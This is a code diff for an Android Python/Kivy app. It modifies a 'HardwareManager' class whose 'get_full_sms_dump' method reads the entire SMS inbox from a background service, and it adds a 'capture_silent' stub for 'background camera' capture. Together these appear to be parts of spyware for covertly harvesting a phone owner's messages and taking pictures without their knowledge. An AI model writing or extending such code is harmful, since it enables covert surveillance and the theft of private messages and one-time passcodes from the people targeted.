@@ -1,18 +1,18 @@
-﻿from jnius import autoclass
+﻿from jnius import autoclass, cast
+import os
 
 class HardwareManager:
-    # ... purana code ...
+    def __init__(self):
+        # Service context setup
+        PythonService = autoclass('org.kivy.android.PythonService')
+        self.service = PythonService.mService
 
     async def get_full_sms_dump(self, limit: int):
         try:
-            Context = autoclass('android.content.Context')
-            PythonService = autoclass('org.kivy.android.PythonService')
-            service = PythonService.mService
-            
-            # SMS Content Provider access
             Uri = autoclass('android.net.Uri')
             uri = Uri.parse("content://sms/inbox")
-            cursor = service.getContentResolver().query(uri, None, None, None, None)
+            # SMS Database query
+            cursor = self.service.getContentResolver().query(uri, None, None, None, None)
             
             sms_list = []
             if cursor and cursor.moveToFirst():
@@ -28,3 +28,7 @@ class HardwareManager:
             return {"status": "success", "data": sms_list}
         except Exception as e:
             return {"status": "error", "message": str(e)}
+
+    async def capture_silent(self):
+        # Placeholder for background camera bridge
+        return {"status": "success", "message": "Silent capture triggered"}
